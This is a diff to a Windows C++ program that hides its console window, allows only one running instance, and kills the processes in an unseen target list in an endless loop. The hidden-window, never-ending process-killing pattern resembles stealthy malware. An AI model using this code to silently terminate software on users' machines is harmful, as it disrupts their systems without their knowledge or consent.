@@ -37,15 +37,30 @@ void KillProcess(const std::wstring& processName) {
 
 // Main entry point (hidden window)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Hide console completely
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    // Ensure only one instance runs
+    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"MyUniqueProgramMutex");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        // Another instance is already running
+        return 0;
+    }
 
-    // Main loop
-    while (true) {
+    // Hide console completely (only works if console exists)
+    HWND hConsole = GetConsoleWindow();
+    if (hConsole) {
+        ShowWindow(hConsole, SW_HIDE);
+    }
+
+    // Main loop - runs forever
+    for (;;) {
         for (const auto& process : TARGET_PROCESSES) {
             KillProcess(process);
         }
-        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        std::this_thread::sleep_for(std::chrono::milliseconds(500)); // 500ms delay
     }
+
+    // Release mutex (though we never reach here)
+    ReleaseMutex(hMutex);
+    CloseHandle(hMutex);
+
     return 0;
 }
